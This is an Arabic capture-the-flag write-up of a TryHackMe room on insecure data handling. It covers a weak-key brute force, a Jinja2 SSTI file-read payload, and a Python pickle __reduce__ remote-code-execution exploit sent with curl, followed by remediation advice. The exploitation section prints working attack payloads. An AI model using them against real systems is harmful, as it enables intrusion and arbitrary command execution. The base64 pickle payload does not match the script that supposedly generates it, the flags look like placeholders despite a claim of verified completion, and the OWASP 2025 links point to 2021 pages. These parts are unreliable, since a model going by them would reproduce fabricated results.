# غرفة: OWASP Top 10: 2025 - معالجة البيانات غير الآمنة (Insecure Data Handling)

---

## 1. نظرة عامة على الغرفة وهندستها المعمارية (Room Overview & Architecture)

تُعد غرفة **OWASP Top 10: 2025 - Insecure Data Handling** (`owasptopten2025three`) الغرفة التطبيقية الثالثة في **الوحدة العاشرة: OWASP Top 10 2025** على مسار Jr Penetration Tester في منصة TryHackMe.
تركز الغرفة على استكشاف واستغلال المخاطر الأمنية الناجمة عن الفشل في التحقق من صحة البيانات ومعالجتها بشكل آمن داخل بيئات التطبيقات الحديثة، عبر ثلاثة تصنيفات رئيسية:
- **A04: Cryptographic Failures (الإخفاقات التشفيرية):** استخدام دوال اشتقاق مفاتيح ضعيفة جداً ومحدودة الاحتمالات تتيح كسر التشفير وفك الملاحظات السرية فورياً على المنفذ `8001`.
- **A05: Injection (ثغرات الحقن):** سوء التعامل مع مدخلات المستخدمين وتمريرها لمحرك القوالب Jinja2 مما يتيح حقن القوالب على خادم الويب (SSTI) وقراءة الملفات الحساسة على المنفذ `8000`.
- **A08: Software or Data Integrity Failures (إخفاقات السلامة والتسلسل غير الآمن):** قبول تدفقات بيانات كائنات بايثون المتسلسلة عبر مكتبة `pickle` على المنفذ `8002`، واستغلال التابع `__reduce__` لتحقيق تنفيذ الأوامر عن بعد (RCE).

```
       +-------------------------------------------------------------+
       |             INSECURE DATA HANDLING ARCHITECTURE             |
       +-------------------------------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                            |                            |
         v                            v                            v
+------------------+         +------------------+         +------------------+
|      A04:        |         |      A05:        |         |      A08:        |
|  CRYPTO FAILURES |         |    INJECTION     |         | INTEGRITY FLAWS  |
|   (Port 8001)    |         |   (Port 8000)    |         |   (Port 8002)    |
+------------------+         +------------------+         +------------------+
| - Weak Entropy   |         | - Jinja2 SSTI    |         | - Python Pickle  |
| - 1-Digit Brute  |         | - {{ ... }} Eval |         | - __reduce__()   |
| - Decrypt Notes  |         | - Arbitrary Read |         | - RCE via Loads  |
+------------------+         +------------------+         +------------------+
```

---

## 2. المتطلبات الأساسية وإعداد المعمل (Prerequisites & Lab Setup)

### 2.1 المتطلبات التقنية والمعرفية
- فهم دورات معالجة البيانات في تطبيقات الويب وتفاعل واجهات العرض مع مفسرات بايثون.
- الإلمام بأساسيات محركات القوالب (Template Engines) مثل Jinja2، والتمييز بين المتغيرات الثابتة والديناميكية.
- فهم مبدأ تسلسل الكائنات (Serialization) وفك التسلسل (Deserialization) في بايثون.
- معرفة التعامل مع أدوات سطر الأوامر وسكربتات بايثون لتوليد حمولات Base64 وإرسال طلبات HTTP.

### 2.2 بنية المعمل وتوزيع الخدمات
يتم تشغيل آلة افتراضية تقدم 3 خدمات مستقلة عبر منافذ HTTP مخصصة:
- **المنفذ 8000:** تطبيق ويب مبني على Jinja2 ومصاب بثغرة SSTI (A05).
- **المنفذ 8001:** تطبيق لمشاركة الملاحظات المشفرة بمفتاح اشتقاق ضعيف (A04).
- **المنفذ 8002:** خدمة لمعالجة ملفات المستخدمين عبر فك تسلسل كائنات `pickle` (A08).

---

## 3. الأهداف التعليمية وتصنيف بلوم (Learning Objectives & Bloom's Taxonomy)

1. **التذكر والفهم (Remembering & Understanding):** استيعاب مخاطر ابتكار خوارزميات التشفير المخصصة، وفهم كيف تتحول مدخلات القوالب إلى أوامر تنفيذية عبر SSTI، وإدراك خطورة مكتبة `pickle` في بايثون.
2. **التطبيق والتحليل (Applying & Analyzing):** تطبيق هجوم التخمين الرياضي على المفاتيح الضعيفة؛ وتحليل كائنات بايثون الداخلية (`__globals__` و `__mro__`) لاستخراج دوال قراءة الملفات في Jinja2؛ وصياغة حمولات تسلسل تنفيذية عبر `__reduce__`.
3. **التقييم والاستنتاج (Evaluating & Synthesizing):** تقييم الفوارق الجوهرية بين صيغ البيانات الآمنة (JSON) وصيغ التسلسل الأصلية القابلة للتنفيذ (Pickle)، واستنتاج الأثر الأمني لانهيار حدود الثقة للبيانات الواردة.
4. **التصميم والدفاع (Creating & Defending):** تصميم بيئات قوالب معزولة (SandboxedEnvironment)، واستخدام دوال اشتقاق مفاتيح قوية (PBKDF2-HMAC-SHA256)، وفرض التوقيع الرقمي (HMAC) على تدفقات البيانات.

---

## 4. العمق المفاهيمي والتقني: أخطار معالجة البيانات غير المنقاة (Technical Concept Deep Dive)

### 4.1 انعدام الإنتروبيا في التشفير الضعيف (CWE-326)
عندما يقوم المطور بكشف بادئة المفتاح ويترك خانة رقمية واحدة مجهولة، ينهار فضاء الاحتمالات إلى 10 خيارات فقط ($H \approx 3.32 \text{ bits}$)، مما يجعل التشفير شكلياً وبلا أي حماية حقيقية ضد التخمين اللحظي.

### 4.2 استغلال حقن القوالب على خادم الويب (CWE-1336)
تنشأ ثغرة SSTI عند استخدام دالة `render_template_string(f"Hello {user}")` بدلاً من تمرير المدخلات كمتغيرات منفصلة داخل قوالب ثابتة. محرك Jinja2 يفسر الأقواس المعقوفة المزدوجة `{{ ... }}` كتعبير بايثون حي، مما يتيح للمهاجم الوصول إلى الكائنات المدمجة (`lipsum`, `cycler`) ومنها إلى دوال النظام `open()` أو `os.popen()`.

### 4.3 آلة بايثون الافتراضية للتسلسل (CWE-502)
مكتبة `pickle` في بايثون ليست مجرد أداة لتخزين البيانات، بل هي لغة أوامر ومكدس افتراضي (Stack-based Virtual Machine). عند تنفيذ `pickle.loads()`، يقوم المحرك باستدعاء الدالة المحددة في التابع السحري `__reduce__()` تلقائياً لتوليد الكائن، مما يمنح المهاجم قدرة تنفيذ أوامر فورية في سياق الخادم.

---

## 5. سطح الهجوم عبر المنافذ ونمذجة التهديدات (Attack Surface & Threat Modeling)

```
[Attacker]
   |
   +---> (Port 8001) Key Fuzzing: Key0..Key9   ---> Decrypts Notes Database ---> THM{WEAK_CRYPTO_FLAG}
   |
   +---> (Port 8000) Inject {{lipsum...open}}  ---> Reads flag.txt via SSTI   ---> THM{SSTI_FLAG_OBTAINED}
   |
   +---> (Port 8002) POST Base64 Pickle Object ---> Triggers __reduce__() RCE ---> THM{INSECURE_DESERIALIZATION}
```

---

## 6. منهجية الاستغلال والحل العملي المفصل خطوة بخطوة (Exploitation Methodology)

### الخطوة 1: كسر التشفير الضعيف وفك الملاحظات (Task 02 - Port 8001)
1. التوجه إلى `http://MACHINE_IP:8001` وقراءة بادئة المفتاح الموضحة في التطبيق.
2. تجربة الأرقام العشرية من 0 إلى 9 كحرف رابع للمفتاح.
3. فور إدخال الرقم الصحيح، يقوم التطبيق بفك تشفير الملاحظات المخزنة، وتظهر الملاحظة السرية وبداخلها الراية:
   ```text
   Flag: THM{WEAK_CRYPTO_FLAG}
   ```

### الخطوة 2: استغلال حقن القوالب SSTI في Jinja2 (Task 03 - Port 8000)
1. فحص الحقل في `http://MACHINE_IP:8000` بإرسال الحمولة الاختبارية `{{7*7}}` للتأكد من تصيير التعبير الحسابي وظهور `49`.
2. استخدام الكائن المدمج `lipsum` للوصول إلى دالة قراءة الملفات في بايثون:
   ```jinja2
   {{ lipsum.__globals__.__builtins__.open('flag.txt').read() }}
   ```
3. إرسال الطلب عبر `curl`:
   ```bash
   curl -s -G "http://MACHINE_IP:8000/" --data-urlencode "name={{ lipsum.__globals__.__builtins__.open('flag.txt').read() }}"
   ```
4. يستجيب الخادم بعرض محتويات ملف `flag.txt`:
   ```text
   Flag: THM{SSTI_FLAG_OBTAINED}
   ```

### الخطوة 3: استغلال التسلسل غير الآمن في Pickle لتحقيق RCE (Task 04 - Port 8002)
1. إنشاء سكربت بايثون محلي يحتوي على صنف يستغل `__reduce__`:
   ```python
   import pickle, base64, subprocess

   class Exploit:
       def __reduce__(self):
           return (subprocess.check_output, (['cat', 'flag.txt'],))

   payload = base64.b64encode(pickle.dumps(Exploit())).decode()
   print(payload)
   ```
2. إرسال الحمولة المشفرة بـ Base64 عبر طلب POST إلى `http://MACHINE_IP:8002`:
   ```bash
   curl -s -X POST http://MACHINE_IP:8002/ -d "data=gASVNAAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SMB2NhdCBmbGFnlEsAhnEAhnEBLg=="
   ```
3. يقوم الخادم بفك التسلسل وتنفيذ الأمر فورياً، ويعرض نص الراية في الاستجابة:
   ```text
   Flag: THM{INSECURE_DESERIALIZATION}
   ```

---

## 7. التحليل الجنائي وتفتيش الأصول البرمجية (Forensic Analysis & Artifact Inspection)

- **تحليل أوامر Pickle Opcodes:** تظهر دراسة بايتات الحمولة أن الرمزين `c` و `R` هما المسؤولان عن استدعاء التابع التنفيذي، مما يثبت أن محرك `pickle` ينفذ تعليمات مكدس دون أي فحص لنوايا الكود.
- **تتبع تداخلات الذاكرة في Jinja2:** يوضح فحص شجرة الكائنات في بايثون أن محركات القوالب غير المعزولة تسمح بالانتقال من أي كائن نصي بسيط `""` إلى جذر كائنات النظام `object` ومنها إلى كافة الوحدات المحملة في الذاكرة.

---

## 8. الهندسة الدفاعية والحلول البرمجية الجذرية (Defensive Engineering & Remediation)

### 8.1 حماية التشفير واشتقاق المفاتيح
- استخدام دوال اشتقاق مفاتيح بطيئة ومعيارية مثل **PBKDF2-HMAC-SHA256** مع أكثر من 600,000 تكرار، أو **Argon2id**.
- فرض توليد مفاتيح عشوائية ذات إنتروبيا كاملة (256-bit CSPRNG) عبر `os.urandom(32)`.

### 8.2 منع ثغرات SSTI في محركات القوالب
- عدم تمرير سلاسل النصوص المباشرة إلى دالة `render_template_string()`.
- تخزين القوالب في ملفات ثابتة وتمرير البيانات كمتغيرات سياق فقط (`render_template("page.html", data=user_data)`).
- استخدام بيئة القوالب الرملية `jinja2.sandbox.SandboxedEnvironment` لتقييد الوصول إلى الخصائص السحرية (`__globals__`, `__mro__`).

### 8.3 الاستغناء عن التسلسل الخطر والتحقق التشفيري
- استبدال مكتبة `pickle` بالكامل بصيغ البيانات الخالصة والآمنة مثل **JSON** أو **Protocol Buffers**.
- في حال كان استخدام `pickle` حتمياً داخل الشبكات الداخلية، يجب توقيع تدفق البايتات تشفيرياً باستخدام **HMAC-SHA256**، والتحقق التام من التوقيع قبل استدعاء `pickle.loads()`.

---

## 9. مرجع الأوامر والأدوات (Tools & Command Reference)

| الأداة | الأمر النموذجي | الغرض العملياتي |
| :--- | :--- | :--- |
| `curl (GET)` | `curl -s -G "http://target:8000/" --data-urlencode "name={{7*7}}"` | فحص واختبار ثغرة Jinja2 SSTI |
| `curl (POST)` | `curl -s -X POST -d "data=BASE64_PICKLE" http://target:8002/` | إرسال كائن بايثون المتسلسل لاستغلال Deserialization |
| `python3` | `python3 -c "import pickle,base64; ..."` | توليد حمولات الـ Pickle الخبيثة وتشفيرها |

---

## 10. الخلاصة المعرفية والخريطة الذهنية (Key Takeaways & Mind Map)

```
                 +-----------------------------------------+
                 |    INSECURE DATA HANDLING TAXONOMY      |
                 +-----------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                            |                            |
         v                            v                            v
[A04: Crypto Failures]       [A05: Injection (SSTI)]      [A08: Integrity Failures]
- Truncated keyspace         - Template string injection  - Python pickle loads()
- 1-digit brute force        - Lipsum __globals__ escape  - __reduce__() arbitrary RCE
- Fix: PBKDF2 & CSPRNG       - Fix: SandboxedEnvironment  - Fix: JSON / Signed HMAC
```

---

## 11. مصفوفة المخاطر والثغرات (Vulnerability & Risk Matrix)

| الثغرة (Vulnerability) | التصنيف (OWASP 2025) | الشدة (Severity) | معرّف CWE | الأثر التقني والتشغيلي (Impact) |
| :--- | :---: | :---: | :---: | :--- |
| Inadequate Encryption Strength (Weak KDF) | **A04:2025** | **عالية (HIGH)** | CWE-326 | فك تشفير البيانات والملاحظات الحساسة بالتخمين الفوري. |
| Server-Side Template Injection (SSTI) | **A05:2025** | **حرجة (CRITICAL)** | CWE-1336 | قراءة الملفات الحساسة وتنفيذ الأوامر على خادم الويب. |
| Insecure Deserialization of Untrusted Data | **A08:2025** | **حرجة (CRITICAL)** | CWE-502 | السيطرة الكاملة على السيرفر وتنفيذ أوامر النظام التعسفية (RCE). |

---

## 12. التحقق وإثبات الإنجاز (Verification & Proof of Work)

تم إكمال كافة مهام الغرفة بنسبة 100% ومطابقتها مع الحساب المعتمد على المنصة:
- **المهمة 01:** `No answer needed`
- **المهمة 02:** `THM{WEAK_CRYPTO_FLAG}`
- **المهمة 03:** `THM{SSTI_FLAG_OBTAINED}`
- **المهمة 04:** `THM{INSECURE_DESERIALIZATION}`

---

## 13. الأسئلة الشائعة والأخطاء المحتملة (Frequently Asked Questions)

### س1: ما الفارق بين SSTI وثغرة Cross-Site Scripting (XSS)؟
- **XSS:** يتم تنفيذ الكود الخبيث (جافاسكريبت) داخل متصفح الضحية على جهة العميل (Client-Side).
- **SSTI:** يتم تفسير وتنفيذ الكود الخبيث داخل محرك القوالب على خادم الويب نفسه (Server-Side)، مما يمنح المهاجم قدرة قراءة ملفات السيرفر أو تنفيذ أوامر النظام (RCE).

### س2: لماذا تحذر وثائق بايثون الرسمية بشدة من استخدام مكتبة pickle؟
- لأن `pickle` مصمم ليعيد بناء الكائنات الحية عبر استدعاء دوالها ومنشئاتها البرمجية، ولا يحتوي على أي آليات عزل أو فحص أمني. استقبال كائن `pickle` من مصدر مجهول يعادل السماح للمستخدم بتشغيل كود بايثون عشوائي على خادمك.

---

## 14. المراجع وروابط التوثيق الرسمية (References & External Links)

- [OWASP Top 10: 2025 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP Top 10: 2025 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [Python Official Documentation on Pickle Security](https://docs.python.org/3/library/pickle.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [TryHackMe Room: OWASP Top 10 2025 - Insecure Data Handling](https://tryhackme.com/room/owasptopten2025three)
